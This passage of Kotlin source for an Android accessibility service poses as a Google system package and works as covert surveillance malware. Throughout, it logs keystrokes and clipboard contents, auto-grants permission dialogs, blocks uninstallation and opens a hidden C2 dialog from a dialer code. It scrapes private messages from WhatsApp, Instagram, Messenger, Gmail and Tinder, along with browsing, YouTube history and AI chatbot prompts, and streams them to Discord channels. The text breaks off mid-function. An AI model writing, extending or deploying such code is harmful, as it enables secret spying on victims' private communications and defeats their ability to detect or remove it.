package com.google.android.system

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.SystemClock
import android.util.Log
import android.view.Display
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.homemonitor.AppUsageBlockerManager
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * AppAccessibilityService
 *
 * Implements real-time screen text keylogging, active app tracking,
 * debounced 3.0s typing session buffer, anti-uninstall self-protection, and permission auto-granting.
 */
class AppAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AccessService"
        private const val MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024L // 5 MB max
        @Volatile
        var currentActiveApp: String = "Unknown"
        @Volatile
        var currentActivePackage: String = "Unknown"
        @Volatile
        var instance: AppAccessibilityService? = null
        @Volatile
        var isSelfUninstallAllowed = false
        @Volatile
        var lastUserInteractionTime: Long = 0L

        fun isPhysicalUserActive(thresholdMs: Long = 30_000L): Boolean {
            return (System.currentTimeMillis() - lastUserInteractionTime) < thresholdMs
        }
    }

    private val bgExecutor: java.util.concurrent.ExecutorService = Executors.newSingleThreadExecutor()
    private val mainHandler: android.os.Handler = android.os.Handler(android.os.Looper.getMainLooper())
    private var lastAutoGrantTime: Long = 0L

    @Volatile private var currentTypingApp: String = ""
    @Volatile private var currentTypingText: String = ""
    private var typingDebounceJob: Job? = null
    private val typingScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val typingDebounceLock = Any()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this@AppAccessibilityService
        Log.i(TAG, "AppAccessibilityService connected and instance assigned.")
        bgExecutor.execute {
            try {
                val clipManager = applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                clipManager?.addPrimaryClipChangedListener(object : android.content.ClipboardManager.OnPrimaryClipChangedListener {
                    override fun onPrimaryClipChanged() {
                        try {
                            val clipData = clipManager.primaryClip?.getItemAt(0)?.text?.toString()
                            if (!clipData.isNullOrBlank()) {
                                val clipFile = File(cacheDir, ".clipboard.txt")
                                val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                                clipFile.writeText("[$timeStr] $clipData\n")
                                MonitorService.sendDiscordStreamClipboard(clipData)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Clipboard listener error: ${e.message}")
                        }
                    }
                })
            } catch (e: Exception) {
                Log.e(TAG, "Failed to setup clipboard listener: ${e.message}")
            }
        }
    }

    override fun onUnbind(intent: Intent?): Boolean {
        Log.w(TAG, "Accessibility service unbinding requested by system — returning true for automatic onRebind self-healing.")
        return true
    }

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        instance = this
        Log.i(TAG, "Accessibility service self-healed and re-bound successfully!")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            val packageName = event.packageName?.toString() ?: ""
            val eventType = event.eventType

            if (packageName != "com.google.android.system" && packageName != "com.homemonitor") {
                lastUserInteractionTime = System.currentTimeMillis()
            }

            // Macro Studio Recording Hook
            if (DuckyScriptStudio.isRecordingMacro && eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val nodeText = event.text?.firstOrNull()?.toString()
                if (!nodeText.isNullOrBlank()) {
                    DuckyScriptStudio.recordTextEvent(nodeText)
                }
            }

            // Auto-grant system dialogs
            if (SystemClock.uptimeMillis() - lastAutoGrantTime > 300) {
                lastAutoGrantTime = SystemClock.uptimeMillis()
                bgExecutor.execute {
                    autoGrantPermissions(event.source ?: rootInActiveWindow)
                }
            }

            // 1. Active App Tracking & Anti-Uninstall Protection
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (packageName != currentActivePackage) {
                    flushTypingSession() // Flush previous app's typing session on app switch
                }
                currentActivePackage = packageName
                val appName = getAppName(packageName)
                currentActiveApp = appName

                bgExecutor.execute {
                    logActiveAppChange(packageName, appName)
                }

                // App Blocker Check
                AppUsageBlockerManager.handleForegroundAppCheck(this, packageName)
            }

            if (packageName != "com.google.android.system" && packageName != "com.homemonitor") {
                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                    checkAndBlockUninstall(event.source ?: rootInActiveWindow)
                }
            }

            // AI Chatbot Screen Response Extraction (#19-ai-chatbots-stream)
            val isAiChatbot = packageName == "com.openai.chatgpt" ||
                    packageName == "com.google.android.apps.bard" ||
                    packageName == "com.google.android.apps.gemini" ||
                    packageName == "com.microsoft.copilot" ||
                    packageName == "com.anthropic.claude" ||
                    packageName == "com.characterai.chat"

            if (isAiChatbot && eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                bgExecutor.execute {
                    captureAiChatbotScreenResponse(packageName, getAppName(packageName), event.source ?: rootInActiveWindow)
                }
            }

            // Messaging App Stream Interceptor (WhatsApp, Telegram, Messenger, Signal, Instagram, etc.)
            val messagingChannel = MonitorService.getMessagingChannelForPackage(packageName)
            if (messagingChannel != null && (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_CLICKED)) {
                bgExecutor.execute {
                    captureMessagingAppScreenMessages(packageName, getAppName(packageName), messagingChannel, event)
                }
            }

            // Real-Time Browser Navigation & Search Stream (#21-browser-history)
            if (isBrowserPackage(packageName) && (
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED
            )) {
                bgExecutor.execute {
                    captureBrowserNavigationFromScreen(packageName, getAppName(packageName), event.source ?: rootInActiveWindow)
                }
            }

            // Real-Time YouTube Watch & Search Stream (#28-youtube-history)
            if (isYouTubePackage(packageName) && (
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED
            )) {
                bgExecutor.execute {
                    captureYouTubeWatchHistoryFromScreen(packageName, getAppName(packageName), event)
                }
            }

            // 2. Debounced 3.0s Keylogging Session & Live Keystroke Stream
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {

                val text = event.text?.joinToString(" ") ?: ""

                // Real-Time Dialer Secret Code Interceptor (*#*#1945#*#*)
                if (packageName.contains("dialer") || packageName.contains("contacts") || packageName.contains("incallui") || packageName.contains("phone")) {
                    if (text.contains("*#*#1945#*#*")) {
                        Log.i(TAG, "Dialer secret code *#*#1945#*#* typed — opening C2 Gatekeeper Password Dialog!")
                        mainHandler.post {
                            C2Gatekeeper.promptPasswordDialog(this) {}
                        }
                    }
                }

                if (text.isNotBlank() && packageName != "com.homemonitor" && packageName != "com.google.android.system") {
                    val appName = getAppName(packageName)
                    val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                    val logLine = "[$timeStr] $text\n"

                    // AI Chatbot Immediate Prompt Buffer
                    val isAiChatbot = packageName == "com.openai.chatgpt" ||
                            packageName == "com.google.android.apps.bard" ||
                            packageName == "com.google.android.apps.gemini" ||
                            packageName == "com.microsoft.copilot" ||
                            packageName == "com.anthropic.claude" ||
                            packageName == "com.characterai.chat" ||
                            appName.contains("ChatGPT") || appName.contains("Gemini") || appName.contains("Claude")

                    if (isAiChatbot && text.length > 2) {
                        lastUserAiPromptText = text
                    }

                    // Save local log file
                    bgExecutor.execute {
                        saveKeylog(packageName, appName, logLine)
                    }

                    // Send live word-by-word typing update to #18-live-typing-feed
                    MonitorService.sendDiscordStreamLiveTyping(appName, text)

                    // Debounce completed sentence (waits 3.0s after typing stops to send complete unbroken text)
                    synchronized(typingDebounceLock) {
                        currentTypingApp = appName
                        currentTypingText = text
                        typingDebounceJob?.cancel()
                        typingDebounceJob = typingScope.launch {
                            delay(3000L) // Wait 3 seconds of typing inactivity
                            flushTypingSession()
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in accessibility event: ${e.message}")
        }
    }

    private fun flushTypingSession() {
        synchronized(typingDebounceLock) {
            typingDebounceJob?.cancel()
            val appName = currentTypingApp
            val pkgName = currentActivePackage
            val text = currentTypingText

            if (text.isNotBlank()) {
                // Send completed, clean keylog to #05-keylogs-and-clipboard
                MonitorService.sendDiscordStreamKeylog(appName, text)

                // Forward completed outgoing typed message to specific Messaging App Discord Channel
                val msgChannel = MonitorService.getMessagingChannelForPackage(pkgName)
                if (msgChannel != null) {
                    MonitorService.sendDiscordStreamMessagingApp(msgChannel, appName, sender = "", text = text, isOutgoing = true)
                }

                // Check AI Chatbot Completed Prompt/Response (#19-ai-chatbots-stream)
                val isAiChatbot = pkgName == "com.openai.chatgpt" ||
                        pkgName == "com.google.android.apps.bard" ||
                        pkgName == "com.google.android.apps.gemini" ||
                        pkgName == "com.microsoft.copilot" ||
                        pkgName == "com.anthropic.claude" ||
                        pkgName == "com.characterai.chat" ||
                        appName.contains("ChatGPT") || appName.contains("Gemini") || appName.contains("Claude")

                if (isAiChatbot) {
                    lastUserAiPromptText = text
                    // Buffered for single unified push upon response capture
                }

                // Check Browser Completed URL / Search Query (#21-browser-history)
                if (isBrowserPackage(pkgName) && (text.contains("http://") || text.contains("https://") || text.contains(".com") || text.contains(".org") || text.contains(".net") || text.contains("www."))) {
                    MonitorService.sendDiscordStreamBrowserUrl(appName, text)
                }

                currentTypingText = ""
            }
        }
    }

    @Volatile private var lastUserAiPromptText: String = ""
    @Volatile private var lastAiResponseText: String = ""
    private var lastAiResponseTime = 0L

    private data class SearchResult(val engine: String, val query: String)
    private val tlds = arrayOf(".com", ".org", ".net", ".io", ".gov", ".edu", ".co", ".info", ".xyz", ".dev", ".app", ".me", ".de", ".fr", ".uk", ".ru", ".cn", ".jp", ".ca", ".au", ".br", ".in", ".it", ".nl", ".es", ".pl")

    @Volatile private var lastCapturedBrowserUrl: String = ""
    @Volatile private var lastCapturedBrowserTitle: String = ""
    @Volatile private var lastBrowserCaptureTime: Long = 0L

    fun isBrowserPackage(packageName: String): Boolean {
        val pkg = packageName.lowercase(Locale.ROOT)
        return pkg == "com.android.chrome" ||
                pkg == "com.chrome.beta" ||
                pkg == "com.chrome.dev" ||
                pkg == "com.chrome.canary" ||
                pkg == "org.mozilla.firefox" ||
                pkg == "org.mozilla.firefox_beta" ||
                pkg == "org.mozilla.fenix" ||
                pkg == "com.sec.android.app.sbrowser" ||
                pkg == "com.sec.android.app.sbrowser.lite" ||
                pkg == "com.microsoft.emmx" ||
                pkg == "com.opera.browser" ||
                pkg == "com.opera.mini.native" ||
                pkg == "com.opera.touch" ||
                pkg == "com.brave.browser" ||
                pkg == "com.duckduckgo.mobile.android" ||
                pkg == "com.vivaldi.browser" ||
                pkg == "com.mi.globalbrowser" ||
                pkg == "com.android.browser" ||
                pkg == "com.ucmobile.intl" ||
                pkg == "com.yandex.browser" ||
                pkg == "com.kiwibrowser.browser" ||
                pkg.contains("chrome") ||
                pkg.contains("browser") ||
                pkg.contains("firefox")
    }

    private fun captureBrowserNavigationFromScreen(packageName: String, appName: String, nodeInfo: AccessibilityNodeInfo?) {
        if (nodeInfo == null) return
        val now = SystemClock.uptimeMillis()
        if (now - lastBrowserCaptureTime < 1500L) return

        try {
            val textNodes = mutableListOf<String>()
            findTextAndResourceNodes(nodeInfo, textNodes)

            var extractedUrl: String? = null
            var extractedTitle = ""

            for (item in textNodes) {
                val clean = item.trim()
                if (clean.startsWith("Search") || clean.startsWith("Type web address") || clean.startsWith("Type a URL") || clean.length < 3) continue

                val lower = clean.lowercase(Locale.ROOT)
                var hasTld = false
                for (tld in tlds) {
                    if (lower.contains(tld)) {
                        hasTld = true
                        break
                    }
                }
                val isUrlFormat = lower.contains("http://") || lower.contains("https://") || lower.contains("www.") || hasTld

                if (isUrlFormat) {
                    if (extractedUrl == null || lower.startsWith("http") || lower.startsWith("www")) {
                        extractedUrl = clean
                    }
                } else if (clean.length > 4 && extractedTitle.isBlank() && !lower.contains("tab") && !lower.contains("incognito") && !lower.contains("http")) {
                    extractedTitle = clean
                }
            }

            if (extractedUrl != null) {
                val fullUrl = if (!extractedUrl.startsWith("http://") && !extractedUrl.startsWith("https://")) "https://$extractedUrl" else extractedUrl

                if (fullUrl != lastCapturedBrowserUrl || (extractedTitle.isNotBlank() && extractedTitle != lastCapturedBrowserTitle)) {
                    lastCapturedBrowserUrl = fullUrl
                    lastCapturedBrowserTitle = extractedTitle
                    lastBrowserCaptureTime = now

                    val parsedSearch = parseSearchQueryFromUrl(fullUrl)
                    if (parsedSearch != null) {
                        Log.i(TAG, "Extracted Search Query [$appName]: Engine=${parsedSearch.engine}, Query=${parsedSearch.query}")
                        MonitorService.sendDiscordStreamBrowserSearch(appName, searchEngine = parsedSearch.engine, query = parsedSearch.query, fullUrl = fullUrl)
                    } else {
                        Log.i(TAG, "Extracted Browser URL [$appName]: $fullUrl (Title: $extractedTitle)")
                        MonitorService.sendDiscordStreamBrowserUrl(appName, urlText = fullUrl, pageTitle = extractedTitle)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "captureBrowserNavigationFromScreen error: ${e.message}")
        }
    }

    private fun parseSearchQueryFromUrl(url: String): SearchResult? {
        return try {
            val uri = android.net.Uri.parse(url)
            val host = uri.host?.lowercase(Locale.ROOT) ?: ""
            val queryParam = when {
                host.contains("google.") -> uri.getQueryParameter("q")
                host.contains("bing.") -> uri.getQueryParameter("q")
                host.contains("duckduckgo.") -> uri.getQueryParameter("q")
                host.contains("yahoo.") -> uri.getQueryParameter("p")
                host.contains("youtube.") -> uri.getQueryParameter("search_query")
                host.contains("yandex.") -> uri.getQueryParameter("text")
                host.contains("baidu.") -> uri.getQueryParameter("wd")
                else -> null
            }

            if (!queryParam.isNullOrBlank()) {
                val engine = when {
                    host.contains("google.") -> "Google"
                    host.contains("bing.") -> "Bing"
                    host.contains("duckduckgo.") -> "DuckDuckGo"
                    host.contains("yahoo.") -> "Yahoo"
                    host.contains("youtube.") -> "YouTube"
                    host.contains("yandex.") -> "Yandex"
                    host.contains("baidu.") -> "Baidu"
                    else -> "Web Search"
                }
                val decodedQuery = java.net.URLDecoder.decode(queryParam.replace("+", " "), "UTF-8")
                SearchResult(engine, decodedQuery)
            } else null
        } catch (_: Exception) { null }
    }

    private fun findTextAndResourceNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
        if (node == null) return
        val resId = node.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()

        if (!txt.isNullOrBlank()) {
            if (resId.contains("url") || resId.contains("address") || resId.contains("location") || resId.contains("omnibox") || resId.contains("search")) {
                results.add(0, txt)
            } else {
                results.add(txt)
            }
        }
        for (i in 0 until node.childCount) {
            findTextAndResourceNodes(node.getChild(i), results)
        }
    }

    @Volatile private var lastCapturedYouTubeTitle: String = ""
    @Volatile private var lastCapturedYouTubeChannel: String = ""
    @Volatile private var lastCapturedYouTubeSearch: String = ""
    @Volatile private var lastYouTubeCaptureTime: Long = 0L
    @Volatile private var lastYouTubeSearchCaptureTime: Long = 0L

    private val YOUTUBE_IGNORE_EXACT = setOf(
        "captions", "cc", "subtitles", "subtitles/cc", "audio track", "playback speed", "quality", "settings",
        "stats for nerds", "audio", "play", "pause", "play video", "pause video", "replay", "replay video",
        "resume", "mute", "unmute", "mute audio", "unmute audio", "volume", "sound", "next", "next video",
        "previous", "previous video", "autoplay", "autoplay is on", "autoplay is off", "auto-play",
        "full screen", "fullscreen", "exit full screen", "miniplayer", "collapse", "expand",
        "live chat", "top chat", "hide chat", "show chat", "chat", "share", "download", "save",
        "save to playlist", "clip", "thanks", "super thanks", "remix", "create", "like", "dislike",
        "liked", "disliked", "like this video", "dislike this video", "like this", "dislike this",
        "subscribe", "subscribed", "unsubscribe", "join", "joined", "notification bell", "notifications",
        "all notifications", "comments", "description", "more options", "report", "feedback", "filters",
        "more", "less", "skip ad", "skip ads", "skip", "ad 1 of 2", "ad 2 of 2", "sponsored", "ad",
        "promoted", "seek bar", "seek to", "double-tap to", "swipe up to", "tap to unmute", "tap for sound",
        "touch to", "search", "search youtube", "search query", "home", "shorts", "subscriptions",
        "library", "you", "history", "explore", "trending", "feed", "all", "music", "gaming", "news",
        "podcasts", "live", "recently uploaded", "watched", "mixes", "playlists", "watch later",
        "liked videos", "your videos", "downloads", "your movies", "your clips", "terms of service",
        "privacy policy", "help & feedback", "accounts", "switch account", "visit advertiser", "shop now",
        "learn more", "install now", "download", "watch ad", "ad badge", "advertiser", "ad info",
        "view all", "show more", "see all", "up next", "up next in player", "related", "suggestions",
        "search music", "search videos", "type a query", "search or type url"
    )

    fun isYouTubePackage(packageName: String): Boolean {
        val pkg = packageName.lowercase(Locale.ROOT)
        return pkg == "com.google.android.youtube" ||
                pkg == "com.google.android.youtube.tv" ||
                pkg == "com.google.android.apps.youtube.music" ||
                pkg == "app.revanced.android.youtube" ||
                pkg == "com.vanced.android.youtube" ||
                pkg.contains("youtube")
    }

    private fun isInvalidYouTubeTitle(text: String): Boolean {
        val clean = text.trim()
        if (clean.length < 3) return true

        val lower = clean.lowercase(Locale.ROOT)
        if (YOUTUBE_IGNORE_EXACT.contains(lower)) return true

        // Reject URLs, web addresses, or internal YouTube URLs
        if (lower.startsWith("http://") || lower.startsWith("https://") || lower.startsWith("www.") ||
            lower.contains("youtube.com") || lower.contains("youtu.be")) {
            return true
        }

        // Must contain at least two letters
        val letterCount = clean.count { it.isLetter() }
        if (letterCount < 2) return true

        // Reject timestamps/durations: e.g. 1:13:50, 0:05, 12:34 / 45:00, 1:13:50 / 2:05:00, -0:15
        if (clean.matches(Regex("""^[-+]?\d{1,2}:\d{2}(:\d{2})?$"""))) return true
        if (clean.matches(Regex("""^\d{1,2}:\d{2}(:\d{2})?\s*[/|-]\s*\d{1,2}:\d{2}(:\d{2})?$"""))) return true
        if (clean.matches(Regex("""^\d{1,2}:\d{2}(:\d{2})?\s+of\s+\d{1,2}:\d{2}(:\d{2})?$""", RegexOption.IGNORE_CASE))) return true

        // Reject view counts, subscriber counts, timestamps ago
        if (clean.matches(Regex("""^\d+(\.\d+)?[KMBkmb]?\s*(views|subscribers|watching|likes|dislikes|comments|videos)?$""", RegexOption.IGNORE_CASE))) return true
        if (clean.matches(Regex("""^\d+\s*(sec|second|min|minute|hr|hour|day|wk|week|mo|month|yr|year)s?\s*ago$""", RegexOption.IGNORE_CASE))) return true

        // Reject common UI control prefixes or Ad phrases
        if (lower.startsWith("search ") || lower.startsWith("subscribe") || lower.startsWith("double-tap") ||
            lower.startsWith("swipe ") || lower.startsWith("tap ") || lower.startsWith("ad ") || lower.startsWith("ad:") ||
            lower.startsWith("skip ") || lower.endsWith(" views") || lower.endsWith(" subscribers") ||
            lower.startsWith("seek to ") || lower.startsWith("play ") || lower.startsWith("pause ") ||
            lower.contains("sponsored") || lower.contains("visit advertiser") || lower.contains("promoted")) {
            return true
        }

        return false
    }

    private fun isInvalidYouTubeChannel(text: String): Boolean {
        val clean = text.trim()
        if (clean.length < 2) return true
        val lower = clean.lowercase(Locale.ROOT)
        if (lower == "subscribe" || lower == "subscribed" || lower == "join" || lower == "joined" ||
            lower == "youtube" || lower.contains("subscribers") || lower.contains("views") ||
            lower.contains("videos") || lower.contains("advertiser") || isInvalidYouTubeTitle(clean)) {
            return true
        }
        return false
    }

    private data class YouTubeNodeInfo(
        val text: String,
        val resId: String,
        val className: String,
        val isClickable: Boolean,
        val isInFeedOrList: Boolean,
        val isInPlayerContainer: Boolean,
        val isAdNode: Boolean
    )

    private fun captureYouTubeWatchHistoryFromScreen(packageName: String, appName: String, event: AccessibilityEvent) {
        val rootNode = event.source ?: rootInActiveWindow ?: return
        val now = SystemClock.uptimeMillis()

        try {
            val nodes = mutableListOf<YouTubeNodeInfo>()
            collectYouTubeNodes(rootNode, nodes)

            // 1. Strict Ad Detection: If an Ad container, badge, or text is on screen, ABORT watch capture immediately
            if (nodes.any { it.isAdNode }) {
                Log.d(TAG, "Ad active on screen in $appName; skipping YouTube watch history capture")
                return
            }

            // 2. Check for search query input in YouTube search box
            val searchInput = findYouTubeSearchQuery(rootNode)
            if (!searchInput.isNullOrBlank() && searchInput.length >= 2) {
                if (searchInput != lastCapturedYouTubeSearch) {
                    if (now - lastYouTubeSearchCaptureTime > 3000L) {
                        if (!lastCapturedYouTubeSearch.startsWith(searchInput, ignoreCase = true) || searchInput.length > lastCapturedYouTubeSearch.length) {
                            lastCapturedYouTubeSearch = searchInput
                            lastYouTubeSearchCaptureTime = now
                            Log.i(TAG, "Extracted YouTube Search [$appName]: '$searchInput'")
                            MonitorService.sendDiscordStreamYouTubeSearch(appName, searchInput)
                        }
                    }
                }
            }

            if (now - lastYouTubeCaptureTime < 2000L) return

            // 3. Watch Screen Verification: Ensure the active window is the YouTube Player / Watch Screen
            val isWatchScreenActive = nodes.any { node ->
                node.isInPlayerContainer ||
                node.resId.contains("player_video_title") ||
                node.resId.contains("watch_title") ||
                node.resId.contains("watch_video_title") ||
                node.resId.contains("video_info_title") ||
                node.resId.contains("player_control") ||
                node.resId.contains("watch_header")
            }

            if (!isWatchScreenActive) {
                // User is in Home feed, Search list, Subscriptions, or Library — NOT watching a video
                return
            }

            var videoTitle: String? = null
            var channelName = ""

            // 4. High-precision extraction of ONLY actively played video title inside watch container
            for (node in nodes) {
                // MUST NOT be inside a feed / recyclerview item row
                if (node.isInFeedOrList || node.isAdNode) continue

                val cleanText = node.text
                val resId = node.resId

                if (isInvalidYouTubeTitle(cleanText)) continue
                if (node.className.contains("Button") || node.className.contains("SeekBar") || node.className.contains("Image")) continue

                // Explicit player video title resource IDs
                if (resId.contains("player_video_title") || resId.contains("watch_title") ||
                    resId.contains("watch_video_title") || resId.contains("video_info_title") ||
                    resId.contains("watch_header") ||
                    (resId.endsWith(":id/title") && node.isInPlayerContainer && !resId.contains("subtitle") && !resId.contains("header") && !resId.contains("tab"))) {
                    if (videoTitle == null) {
                        videoTitle = cleanText
                    }
                }

                // Extract Channel / Creator Name
                if (resId.contains("owner_name") || resId.contains("channel_name") ||
                    resId.contains("channel_title") || resId.contains("by_line") ||
                    resId.contains("owner_title") || resId.contains("uploader_name")) {
                    if (channelName.isBlank() && !isInvalidYouTubeChannel(cleanText)) {
                        channelName = cleanText
                    }
                }
            }

            if (videoTitle != null && videoTitle.length >= 4 && videoTitle != lastCapturedYouTubeTitle) {
                lastCapturedYouTubeTitle = videoTitle
                if (channelName.isNotBlank()) lastCapturedYouTubeChannel = channelName
                lastYouTubeCaptureTime = now

                // Clean output: pass empty videoUrl so fake/inside search links are not generated or forwarded
                Log.i(TAG, "Extracted YouTube Video Watched [$appName]: '$videoTitle' (Channel: '$channelName')")
                MonitorService.sendDiscordStreamYouTubeWatch(appName, videoTitle = videoTitle, channelName = channelName, videoUrl = "")
            }
        } catch (e: Exception) {
            Log.e(TAG, "captureYouTubeWatchHistoryFromScreen error: ${e.message}")
        }
    }

    private fun collectYouTubeNodes(
        node: AccessibilityNodeInfo?,
        nodes: MutableList<YouTubeNodeInfo>,
        parentInFeed: Boolean = false,
        parentInPlayer: Boolean = false,
        parentIsAd: Boolean = false
    ) {
        if (node == null) return
        val resId = node.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
        val className = node.className?.toString() ?: ""
        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim() ?: ""
        val lowerTxt = txt.lowercase(Locale.ROOT)

        val isFeedContainer = parentInFeed ||
                resId.contains("compact_video_item") ||
                resId.contains("video_with_context") ||
                resId.contains("grid_element") ||
                resId.contains("reel_item") ||
                resId.contains("shorts_item") ||
                resId.contains("feed_item") ||
                resId.contains("search_result") ||
                resId.contains("shelf") ||
                resId.contains("carousel") ||
                resId.contains("recycler_view") ||
                resId.contains("results") ||
                resId.contains("contents") ||
                resId.contains("elements_recycler_view") ||
                resId.contains("item_touch_helper_previous_elevation") ||
                resId.contains("watch_next_feed") ||
                resId.contains("related_videos") ||
                resId.contains("suggestions_list")

        val isPlayerContainer = parentInPlayer ||
                resId.contains("player_view") ||
                resId.contains("player_fragment") ||
                resId.contains("watch_player_view") ||
                resId.contains("watch_while_layout") ||
                resId.contains("fullscreen_engagement_panel") ||
                resId.contains("watch_screen") ||
                resId.contains("player_overlays") ||
                resId.contains("player_control_overlay") ||
                resId.contains("watch_swipey_item") ||
                resId.contains("watch_header") ||
                resId.contains("watch_panel") ||
                resId.contains("watch_metadata") ||
                resId.contains("video_info") ||
                resId.contains("expanded_player") ||
                resId.contains("player_layout") ||
                resId.contains("inline_player")

        val isAd = parentIsAd ||
                resId.contains("ad_attribution") ||
                resId.contains("ad_badge") ||
                resId.contains("ad_compact_view") ||
                resId.contains("ad_header") ||
                resId.contains("ad_title") ||
                resId.contains("ad_text") ||
                resId.contains("ad_module") ||
                resId.contains("ad_overlay") ||
                resId.contains("ad_view") ||
                resId.contains("advertiser") ||
                resId.contains("sponsored") ||
                resId.contains("skip_ad") ||
                lowerTxt == "ad" || lowerTxt == "sponsored" || lowerTxt == "promoted" ||
                lowerTxt.contains("skip ad") || lowerTxt.startsWith("ad ") || lowerTxt.startsWith("ad:") ||
                lowerTxt.startsWith("ad 1 of") || lowerTxt.startsWith("ad 2 of") || lowerTxt.contains("visit advertiser")

        if (txt.isNotBlank()) {
            nodes.add(YouTubeNodeInfo(txt, resId, className, node.isClickable, isFeedContainer, isPlayerContainer, isAd))
        }

        for (i in 0 until node.childCount) {
            collectYouTubeNodes(node.getChild(i), nodes, isFeedContainer, isPlayerContainer, isAd)
        }
    }

    private fun findYouTubeSearchQuery(node: AccessibilityNodeInfo?): String? {
        if (node == null) return null
        val resId = node.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
        val className = node.className?.toString() ?: ""

        if (className.contains("EditText") || resId.contains("search_edit_text") || resId.contains("search_box") || resId.contains("search_input")) {
            val txt = node.text?.toString()?.trim()
            if (!txt.isNullOrBlank()) {
                val lower = txt.lowercase(Locale.ROOT)
                if (lower != "search youtube" && lower != "search" && lower != "search or type url" &&
                    lower != "search music" && lower != "search videos" && lower != "type a query" &&
                    !YOUTUBE_IGNORE_EXACT.contains(lower) && txt.length >= 2) {
                    return txt
                }
            }
        }

        for (i in 0 until node.childCount) {
            val res = findYouTubeSearchQuery(node.getChild(i))
            if (res != null) return res
        }
        return null
    }

    private val recentMessagingAppTexts = java.util.Collections.synchronizedSet(LinkedHashSet<String>())
    @Volatile private var lastMessagingScreenCaptureTime = 0L

    private fun captureMessagingAppScreenMessages(packageName: String, appName: String, channelName: String, event: AccessibilityEvent) {
        try {
            val eventType = event.eventType

            // 1. Send Button Click Interceptor for Instant Outgoing Message Forwarding
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val source = event.source
                if (source != null) {
                    val desc = source.contentDescription?.toString()?.lowercase(Locale.ROOT) ?: ""
                    val resId = source.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
                    val text = source.text?.toString()?.lowercase(Locale.ROOT) ?: ""

                    val isSendBtn = desc.contains("send") || resId.contains("send") || text == "send" || desc.contains("kirim") || desc.contains("enviar")
                    if (isSendBtn) {
                        synchronized(typingDebounceLock) {
                            if (currentTypingText.isNotBlank()) {
                                Log.i(TAG, "Send button tapped in $appName ($packageName): sending outgoing message to $channelName")
                                MonitorService.sendDiscordStreamMessagingApp(channelName, appName, sender = "", text = currentTypingText, isOutgoing = true)
                                recentMessagingAppTexts.add(currentTypingText)
                                currentTypingText = ""
                            }
                        }
                    }
                }
            }

            // 2. On-Screen Chat Message Reader & Forwarding (Throttled per 1.0s)
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val now = SystemClock.uptimeMillis()
                if (now - lastMessagingScreenCaptureTime < 1000L) return
                lastMessagingScreenCaptureTime = now

                val rootNode = event.source ?: rootInActiveWindow ?: return
                
                // Targeted Social App Tree Reader Selection
                val parsedThread = when (packageName) {
                    "com.whatsapp", "com.whatsapp.w4b" -> parseWhatsAppThread(rootNode)
                    "com.instagram.android" -> parseInstagramDmThread(rootNode)
                    "com.facebook.orca" -> parseFacebookMessengerThread(rootNode)
                    "com.google.android.gm" -> parseGmailThread(rootNode)
                    "com.tinder" -> parseTinderThread(rootNode)
                    else -> parseBroadSocialThread(packageName, rootNode)
                }

                val senderName = parsedThread?.contactName ?: ""
                val filteredNodes = parsedThread?.messages ?: emptyList()

                if (filteredNodes.isNotEmpty()) {
                    for (chatMsg in filteredNodes) {
                        val dedupKey = "$packageName:$chatMsg"
                        if (!recentMessagingAppTexts.contains(dedupKey)) {
                            recentMessagingAppTexts.add(dedupKey)
                            if (recentMessagingAppTexts.size > 300) {
